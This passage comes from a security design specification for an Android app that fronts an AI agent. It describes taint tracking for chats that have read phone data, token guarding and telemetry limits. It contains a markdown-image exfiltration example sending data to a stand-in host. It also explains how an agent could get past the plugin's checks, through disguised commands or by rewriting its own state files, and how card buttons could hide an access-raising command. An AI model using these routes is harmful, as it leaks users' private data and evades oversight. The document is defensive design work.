- **The nonce.** Hermes redacts text shaped like `<8 or more digits>:<30 or more letters, digits, - or _>` as a bot token (`_TELEGRAM_RE` in `agent/redact.py`, at the pinned Hermes), and the approval text is `phone_data:v1:<kind>:<nonce>:<args hex>`. The only colon with digits before it is the one after the nonce, so the plugin makes the nonce's last character a letter a-f (`new_nonce`): 11 random hex characters and a letter. The args hex has no colon. A 12-digit-ending nonce used to match about 2.3% of the time and the app saw masked text.
- **Chats that have read phone data.** Once a chat has called `phone_data` (whatever the outcome), what the agent writes could carry the rows out: `![](https://x/p.png?d=...)` loads with no tap, and a link or a card's `@OpenUrl` sends it with one. So, only in such a chat and in every access mode including Full access: the web part (`web/src/phone-data-taint.ts`) loads no remote image, video or audio from the agent's text until a tap and shows every address in full before opening it; the shell enforces the same at one choke point, `RemoteGuard` (4.1): while the page says the chat on screen has read phone data (bridge `remoteBlock`, 4.5), `MainActivity`'s `shouldInterceptRequest` answers a request the page makes to a host other than `localhost`, `127.0.0.1` or `[::1]` (images, media, scripts, styles, frames, fonts, fetch; not `file`, `data`, `blob`) with an empty 403 (`remoteRefused`), whatever the page renders, and `shouldOverrideUrlLoading` refuses a main-frame navigation to such an address (a bare `<a>` the page did not wrap; the address dialog's confirmed path is the bridge's `openExternal`, which does not pass through it). Each page load starts blocked until the page reports; the page works the state out before it draws a chat, from the chat's items and from the app's own record (`PhoneDataChats`, 4.1: every `POST /phonedata` read request, whatever its outcome, adds its `session` and the optional `chats` list, ids only in app-private preferences, never evicted (a cap of 2,000 raised in Settings, see round 4 below), kept across restarts) read with the bridge's `phoneDataTainted` (4.5), so a long chat whose `phone_data` call is outside the 60 cached items, a chat resumed from its tip segment, or a parent of a subagent that read is still known. The one exception the user can make is a tap on "Tap to load" for an image (`remoteAllowOnce`: that exact address, once, for 60 s). In such a chat `HtmlFrame` draws no frame at all (the canvas, an inline HTML preview and its full-screen view show the source as text with a note and run no script), because a script could leak through WebRTC (an ICE server lookup) or a `<link rel=dns-prefetch>`, which neither the frame's policy nor the request filter covers; CSS `url(`, `image-set(` and other functions or escapes in an inline style are dropped; Save and Share are hidden on a remote image. The limits: it blocks what the page requests, not what the agent's own tools send (that is the plugin's part); a WebSocket is not covered; the record holds only chats whose read request reached the app, so a chat that never reached it (a plugin that did not send the request) is known only from its items; the page's check of a "no" is repeated at most once a second; and the plugin (`phone_taint.py`, 5.1) asks before commands and tools that can send data out or save text other chats read, except in Full and Auto access, where Hermes's gate approves without asking. The plugin's list is patterns, so a disguised command can slip through, and the agent could edit its state file: a speed bump, not a wall. Shizuku routes are unchanged and the native filter can't stop them. Other chats behave as before. Owner decision: "Chats that have read phone data" in `phone-data-read-only`.
- **Chats that have read phone data, round 3 (lineage, flooding, documents, links, failure).** (1) The page asks the app's record about every id a chat has had, not only today's: its stored id, its live id and everything `lineage.ts` (2.4) knows, so a chat that read in one segment, was compressed and restarted is still found (the plugin sends the compression chain in `chats`, now up to 16 entries). The page learns links only by seeing them (a resume, the session list, a compression, a `session.info`); a chat compressed elsewhere whose page storage was cleared is known only by the ids the app recorded. (2) The record is not evictable by flooding (round 4 below replaced the 30-day rule: no id is ever evicted); one request adds at most 17 new ids; a refused read is recorded like any other. (3) A saved document drawn out of its chat (the Gallery, a Files preview) is judged by its own chat and that chat's lineage, not the chat on screen: held means no HTML run, remote media behind a tap, addresses checked, and the shell's filter on while it is open; a document of an unknown chat is held once any read was recorded. (4) While blocked, `shouldOverrideUrlLoading` also refuses a bare `mailto:`, `tel:`, `sms:`, `geo:`, `market:` or `intent:` link; the address dialog shows the full text and its confirmed `openExternal` is the only way out. (5) Failure closes: a `phoneDataTainted` call that throws means tainted; a shell without the method counts as tainted for documents and chats the page can't judge, and as untainted only for a chat whose items it can see (so a browser run works). **The plugin's protection is a speed bump:** the agent has `write_file` and can rewrite the plugin's own files (`phone_taint.py`, `phone-read.json`, a boot script). The native record, the request filter and the page's dialogs are the enforcement; the plugin's asks only slow a careless run.
- **Chats that have read phone data, round 4 (compression, the record, commands).** (1) **Compression while the app is not watching.** A chat that read in segment 1 and was compressed by Hermes to segment 2 has a new stored id, and the page that later opens segment 2 from the chat list is given only that id (at the pinned Hermes `session.list` rows carry just `id`, and `session.resume` of a tip names no parent), so the page cannot link it. The plugin therefore tells the app: when a chat it already marks as having read shows up under an id it has not marked (found by the next `pre_tool_call`, by `on_session_start` or `on_session_end`, or from the session database's compression chain), it marks the new ids and sends `{"op":"taint","chats":[...]}` on `POST /phonedata` (4.4); the app only ADDS those ids to `PhoneDataChats`, with no grant and whatever `PhoneData.READY` says. Hermes has no hook that fires at the rotation itself (`on_session_start` and `on_session_end` run each turn with the current id), so the report comes at the first call or turn end in the new segment. Not covered: a chat compressed on another device or while the plugin was not running, if the session database does not show the link and the page never saw it. The page's own lineage (2.4) still records every link it is shown (list rows' `id`, `resolved_id`, `parent_session_id` and `_lineage_ids` when present, a resume's requested and resumed ids, a `session.info`). (2) **The record never evicts.** `PhoneDataChats` keeps every id it is given (ids only, no times). The cap starts at 2,000; the first id past it sets the overflow flag (every chat then counts as having read) and later ids are still kept, up to 20,000. Past 20,000 an id has no room and is dropped, which sets a SEPARATE `lost` flag (persisted): every chat counts as having read while it is set, "Allow more chats" never clears it, and only "Forget" does (so a flood of 20,000 fake ids followed by a real chat that reads cannot be undone by tapping Allow more). Settings → Phone data (behind the screen lock) offers "Allow more chats" (cap +2,000, at most 20,000, forgets nothing, clears the overflow flag once the record fits; at the maximum it answers `full` and the page toasts that the limit is reached) and "Forget" (its confirmation says that chats that read phone data lose their protection). (3) The plugin asks for more command shapes (listed in 5.1). Round 5: the record's saves are batched (at most one a second, plus one when the app pauses or the page reads the record), so a crash can lose the last second of ids, never more; an id missing after a crash is re-reported by the plugin at its next tool call (the safe direction: an id may be missing, never invented). The compression-chain lookup runs on the plugin's background thread, 3 seconds at most; the plugin's state file never drops a chat past its bound but sets its own `full` flag (every chat then counts as having read). **The plugin's asks are a speed bump:** the agent can rewrite the plugin's files. The enforcement is the app's own record, its request filter and the page's address dialogs.
- **Order of checks on a read** is in 4.4 (`key`, `not_ready`, `bad_request`, `off`, `no_permission`, `locked`, then the pass or the grant). A grant is used up only when every earlier check passed (a locked phone or a switch turned off leaves it for 2 minutes), and then it is gone even if the read itself fails.

- **Cards and aliases can't change access.** A card is written by the agent and its button text goes back as a message, so `OpenUIBlock` refuses any card text that starts with `/` (`isCommandText`: after spaces and invisible characters) with the toast "Cards can’t run commands. Type the command yourself.", for every chat: a card button labelled to hide `/yolo on` can't turn on Full access. A server `alias` (from `command.dispatch`) whose target is `yolo` is refused too (`runSlash`). Only a `/yolo` the user types, or the Auto button, changes access.
- **Voice never answers it.** In Live mode a phone-data request is not asked by voice: Live says `PHONE_DATA_VOICE` ("Hermux wants to read your phone. This needs a tap in the app. Tap Allow or Deny on the screen."), and anything said afterwards is not an answer, allow or deny: it says it once more, then a toast says "Reading the phone needs a tap in the app" and the request stays on the sheet (`voiceMayAnswer` is false for such a request). Audio could be answering it.

**The diagnostic log (spec 3.21).** Kept on the phone from the start, so a report can say what happened before it, and sent by nothing but a report the user submits. On every layer an event is checked against a fixed shape when written (and again when read on Hermes's side), so free text can't get in: no messages, tool data, paths, error words or chat IDs; the phone's maker but no model or identifier. It reads no other app's data (no logcat). The app's files are app-private and in the folder device backups leave out; Hermes's are readable only by their owner, though the agent runs as that owner, so nothing secret may be logged there either. `GET /diag`, `PUT /diag` and `DELETE /diag` are like the plugin's other routes: on the phone's loopback address only. The diagnostic switch in Settings stops all of it and deletes what was kept.

**Report a problem (`web/src/report.ts`, spec 3.21).** Nothing leaves the phone until the user taps Submit on the sheet, which says first that the report will be a public GitHub issue. A report holds the user's title and text, the app, Android and Hermes versions (no phone model, no device ID), the diagnostic log only when the user switched it on and saw it (after `scrubLog`), a screenshot only when the user picked one, and a random per-install ID (`hm.reportId`) used only for the relay's daily limit. Through the relay the diagnostic log isn't public: the issue only names it, the relay keeps it 30 days without saying who sent it, and it takes the Worker secret `LOG_READ_KEY` to read. In a build without a relay the sheet says first that it will be public. It goes to the owner's relay (`relay/report/`, a Cloudflare Worker), which holds the GitHub token as a Worker secret: no token is in the repository or the app. Like every request, it carries the sender's IP address; the relay stores it only as a salted hash in a daily counter that expires after two days. Without a relay URL in the build, or when the relay fails, nothing is sent by the app: GitHub's new-issue page opens in the browser with the text filled in, and the user submits it there.

**Opt-in usage stats (`web/src/stats.ts`, Aptabase).** Off by default. Without an app key in the build (`__STATS_KEY__`, empty in every build until the owner sets one) `statsAvailable()` is false: nothing is offered, nothing listens, nothing is sent. With a key, nothing is sent until the user says yes on the card (3.18) or in Settings → About (3.15). The page has no Content Security Policy of its own (only canvas frames do, `htmlframe.ts`), and `network_security_config.xml` allows any TLS host, so the HTTPS request needs no rule change; Aptabase's events route answers cross-origin requests from any origin with the `App-Key` header.

- **What the request body holds**, one short list in code (`STATS_EVENTS`): the events `app_start`, `screen_open` (with `screen`, one of the fixed screen names) and `heard_from` (with `source`, one of the fixed choices). `track` drops a name, property or value that isn't on the list. Every event also has `timestamp`, `sessionId` (the random install ID, `hm.statsId`: 16 random bytes, not derived from the device, also what makes Aptabase's "sessions" count installs), and `systemProps`: `osName` (`Android`), `osVersion`, `appVersion`, `isDebug`, `sdkVersion`.
- **Never in the body:** chat contents, prompts, tool output, file names, model keys, account names, phone numbers, the phone's locale or its model.
- **What the receiving side gets anyway.** Like every request from the page, it carries the sender's IP address and the WebView's `User-Agent` header, which on Android names the phone model and the page can't change it (`fetch` and `XMLHttpRequest` ignore a `User-Agent` they set). Aptabase's privacy policy says both are only processed in memory and never stored. Its published server code derives and stores from them a country code, a region and a one-day pseudonymous user ID (a keyed hash with a salt rotated daily). No IP-derived data is stored by this project; the card says what Aptabase keeps.
- **Off** (`setStatsChoice(false)`): drops what is waiting, aborts a running request and forgets the install ID; a later yes makes a new one.
- **Bounds:** events wait in memory and go in one batch (at most `MAX_BATCH`), 30 s after the first (`FLUSH_AFTER_MS`) or when the app goes to the background (`keepalive`). One one-shot timer at a time and none while hidden; a request gives up after 10 s (`TIMEOUT_MS`); a failed event is tried once more, 5 minutes later or sooner if the app goes to the background or comes back (`MAX_TRIES`, `RETRY_AFTER_MS`), a rejected one never; at most `MAX_PER_LAUNCH` events per launch; nothing queued is kept on disk. Failures are silent.

**Dashboard token scrape.**
- Hermes's dashboard puts its session token into its HTML page as `window.__HERMES_SESSION_TOKEN__ = "…"` and
  mints a new one on every start. Everything that talks to the dashboard scrapes it from `http://127.0.0.1:9119/`
  with the same pattern, except the app: `MainActivity.dashboardToken` (used by `MainActivity.token`, cached and refreshed on a new connect and after a 401/403, and by
  `HermesService.dashboardToken`, for notification answers and Stop) takes it only through local authentication (above), and never reads the page.
  The plugin's `/approve` and `/stop` routes take it in process (`_own_page_token`); `phone/plugin-update.sh` and the
  developer tools get it from `GET /hermux/token` after a verified hello (above), apart from the update script's one
  exception.
- **The page keeps the token only for a caller with the event key.** Every app on an Android phone shares `127.0.0.1`, so any installed app with internet access could otherwise read that page and drive Hermes: send prompts, turn on Full access, answer approvals past the fingerprint check, read files through `/media`. The plugin's `_TokenGuard` (ASGI middleware that `_install_token_guard` adds when the dashboard imports `plugin_api.py`, before its server starts) takes the token out of HTML pages unless the request's `X-Hermes-Mobile-Key` matches `~/.hermes-mobile/key`, which only Termux's user can read, and `~/.hermes-mobile/enforced` does not exist (then the token goes only through `GET /hermux/token`, above). Other pages get `window.__HERMUX_TOKEN_WITHHELD__=1` in its place. It is in the plugin rather than a Hermes patch because the plugin follows every app update (6.6) and patches don't. With no `/data/data/com.termux/files/home` folder (not a phone) nothing is withheld; `HM_DASH_KEY_FILE` names another key file for `tools/hermes-contract`.
- **A key that differs from Termux's** (a reinstall gets a new key) shows as a hello with an unknown key id or a wrong proof: `HermesService.shareKeyWithTermux` sends the key again through `RUN_COMMAND`, once per episode (until a hello verifies), and the dashboard is tried again 5 s and 20 s later (above).
- **Limits.** An older plugin, or one held or changed by hand (6.6), still serves the token until it is replaced. If the guard can't be added, pages stay as Hermes serves them and the dashboard logs an error; the contract check fails when the pinned Hermes stops allowing it. Hermes's own web interface can no longer connect from a plain browser on the phone without the key ([app-is-the-only-front-end](../decisions/app-is-the-only-front-end.md)).
- Developer tools (`tools/api`, `tools/gw_rpc.py`, `tools/gw_time.py`, `tools/e2e.py`, `tools/probe_model_switch.py`, `tools/battery/reqcost.py`, `tools/battery/wschat.py`, `web/devserver.py`) get the token from a verified dashboard (`local_auth.dashboard_token`, on a computer through `tools/devtoken.py`); they read the key file when run on the phone, and over `adb forward` take `HM_EVENT_KEY` (`tools/phone 'cat ~/.hermes-mobile/key'`) and check the proof against `HM_DASH_ADDR` (default `127.0.0.1:9119`). `web/devserver.py` without a key reads a mock's page as served (no key sent). `tools/e2e.py` posts its events through `hm-local post` on the phone.
- REST calls carry it in `X-Hermes-Session-Token` (added by the shell), with `X-Hermux-Nonce` (above). The WebSocket URL carries it as `?token=`,
  which is how Hermes's gateway accepts a WebSocket; the URL is built fresh for each connect and never stored.
- The background host's token stays out of URLs and the page; the plugin never sends it to the host (it signs with it), and it reaches the app only inside a `bgapp` event to a verified listener. In the app it stays in Java, as the key of its hello; the app never sends it in `X-HM-Token`.
